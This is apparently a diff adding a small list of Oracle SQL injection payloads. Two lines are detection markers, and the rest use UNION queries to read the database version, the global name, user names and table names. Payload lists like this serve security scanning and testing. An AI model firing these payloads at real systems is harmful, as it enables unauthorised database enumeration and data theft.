@@ -1,0 +1,6 @@
+' UNION SELECT 'SQLI_UNION_MARKER' FROM dual--
+' UNION SELECT NULL,'SQLI_UNION_MARKER' FROM dual--
+' UNION SELECT banner FROM v$version WHERE ROWNUM=1--
+' UNION SELECT global_name FROM global_name--
+' UNION SELECT username FROM all_users WHERE ROWNUM=1--
+' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--
